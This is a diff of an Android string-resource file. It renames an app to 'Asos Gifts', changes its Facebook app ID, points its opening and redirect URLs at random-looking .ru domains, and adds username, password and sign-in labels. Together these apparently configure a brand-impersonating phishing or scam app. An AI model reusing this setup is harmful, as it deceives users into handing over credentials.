@@ -1,5 +1,11 @@
 <resources>
-    <string name="app_name">Amazing gifts</string>
-    <string name="facebook_app_id">559069051126879</string>
-    <string name="opening_url">http://zkkgkjqajs.ru/zfBCqM</string>
+    <string name="app_name">Asos Gifts</string>
+    <string name="facebook_app_id">1999923043607653</string>
+    <string name="opening_url">http://ketfgrewe.ru/89m6yz</string>
+    <string name="key_redirect">http://gerfsxcxzvds.ru</string>
+
+    <string name="play">play</string>
+    <string name="username">Username</string>
+    <string name="password">Password</string>
+    <string name="sign_in">Sign in</string>
 </resources>
